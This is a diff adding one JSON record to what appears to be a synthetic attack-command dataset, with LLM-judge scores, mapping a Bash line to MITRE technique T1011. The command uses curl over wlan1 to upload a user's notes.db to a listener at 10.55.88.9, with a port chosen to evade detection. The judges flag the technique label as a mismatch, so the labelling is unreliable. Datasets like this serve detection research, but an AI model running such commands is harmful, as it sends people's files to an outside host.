@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && curl --silent --show-error --interface wlan1 --max-time 5 -T /home/user/.config/notes.db http://10.55.88.9:49190/upload",
+  "explanation": "Uses curl bound to wlan1 to PUT a file to an HTTP listener on a high port, representing exfiltration over a different network medium per T1011.",
+  "rationale_steps": [
+    "Check wlan1 operability with iwconfig.",
+    "Force the HTTP transfer over wlan1 via curl's --interface option.",
+    "Use an uncommon port to avoid typical web traffic signatures while not altering system routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-998ddfac",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash command with valid redirections, control operators, and curl options; no quoting or flag issues.",
+        "semantic_score": 1,
+        "semantic_justification": "This performs HTTP exfiltration over a network interface (wlan1), not transfer to or use of a physical medium, so it does not implement T1011.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:24:11.288085Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both iwconfig and curl, and correct command chaining with && operator.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does attempt exfiltration by transferring a file over a network interface, it doesn't align with T1011 (Exfiltration Over Physical Medium) as it's using a wireless network interface rather than a physical removable device.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:24:14.772187Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, utilizing valid Linux utilities, correct flags, proper redirection, and logical command chaining without any syntax errors.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command effectively performs network exfiltration using `curl` bound to a specific interface, this action fundamentally misaligns with T1011 'Exfiltration Over Physical Medium,' which describes data transfer to physical storage devices, not over a network.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:24:34.681073Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
